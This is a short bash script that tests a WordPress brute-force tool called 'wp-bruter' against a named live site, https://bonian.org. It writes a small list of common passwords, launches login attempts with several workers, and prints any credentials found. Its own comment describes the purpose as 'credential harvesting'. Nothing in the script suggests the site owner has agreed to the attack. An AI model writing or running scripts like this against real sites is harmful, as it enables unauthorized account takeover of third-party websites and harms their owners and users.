#!/bin/bash
# Quick test script to validate credential harvesting

TEST_SITE="https://bonian.org"

echo "Testing credential harvesting on: $TEST_SITE"
echo ""

# Create small password list for testing
cat > test_pass.txt << 'PASS'
admin
password
wordpress
admin123
test
PASS

# Create test site list
echo "$TEST_SITE" > test_sites.txt

echo "Running quick test (10 sec timeout, 1 active site)..."
./wp-bruter \
    -sites test_sites.txt \
    -passlist test_pass.txt \
    -output test_results.txt \
    -max-workers 5 \
    -max-active-sites 1 \
    -timeout 3 \
    -verbose &

TEST_PID=$!
sleep 15
kill $TEST_PID 2>/dev/null || true
wait $TEST_PID 2>/dev/null

echo ""
echo "Results:"
if [ -f test_results.txt ]; then
    echo "Found:" && wc -l test_results.txt && cat test_results.txt || echo "(none)"
else
    echo "No results file"
fi
